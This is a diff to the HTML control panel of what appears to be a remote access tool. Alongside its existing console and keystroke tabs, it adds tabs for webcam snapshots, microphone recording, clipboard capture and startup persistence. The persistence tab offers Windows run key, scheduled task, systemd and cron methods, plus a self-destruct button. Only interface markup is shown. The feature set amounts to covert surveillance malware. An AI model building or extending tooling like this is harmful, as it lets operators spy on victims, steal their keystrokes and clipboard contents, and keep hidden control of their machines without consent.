@@ -31,6 +31,9 @@
       <button type="button" data-tab="console">console</button>
       <button type="button" data-tab="fun">fun</button>
       <button type="button" data-tab="keys">keys</button>
+      <button type="button" data-tab="media">media</button>
+      <button type="button" data-tab="clip">clip</button>
+      <button type="button" data-tab="persist">persist</button>
       <button type="button" data-tab="access" class="admin-only">access</button>
     </nav>
 
@@ -129,6 +132,49 @@
         <span class="dim" id="keys-info"></span>
       </div>
       <pre id="keys" class="terminal"></pre>
+    </div>
+
+    <div class="panel" id="tab-media">
+      <div class="toolbar">
+        <button type="button" class="action" id="btn-cam">snap</button>
+        <input id="mic-sec" class="field narrow" value="5" spellcheck="false" />
+        <span class="dim">sec audio</span>
+        <button type="button" class="action" id="btn-mic">record</button>
+        <span class="dim" id="media-info"></span>
+      </div>
+      <div class="notice error" id="media-err"></div>
+      <img id="cam-shot" alt="" hidden />
+      <audio id="mic-audio" controls hidden></audio>
+    </div>
+
+    <div class="panel" id="tab-clip">
+      <div class="toolbar">
+        <button type="button" class="action" id="btn-clip-start">start</button>
+        <button type="button" class="action" id="btn-clip-stop">stop</button>
+        <button type="button" class="action" id="btn-clip-clear">clear</button>
+        <span class="dim" id="clip-info"></span>
+      </div>
+      <div class="notice error" id="clip-err"></div>
+      <pre id="clip-list" class="terminal"></pre>
+    </div>
+
+    <div class="panel" id="tab-persist">
+      <div class="toolbar">
+        <select id="persist-mode" class="field">
+          <option value="auto" selected>auto</option>
+          <option value="run">run key</option>
+          <option value="schtasks">schtasks</option>
+          <option value="systemd">systemd</option>
+          <option value="cron">cron</option>
+        </select>
+        <button type="button" class="action" id="btn-persist-install">install</button>
+        <button type="button" class="action" id="btn-persist-remove">remove</button>
+        <button type="button" class="action" id="btn-persist-status">status</button>
+        <span class="spacer"></span>
+        <button type="button" class="action danger" id="btn-selfdestruct">self-destruct</button>
+      </div>
+      <div class="notice error" id="persist-err"></div>
+      <pre id="persist-out" class="terminal"></pre>
     </div>
 
     <div class="panel admin-only" id="tab-access">
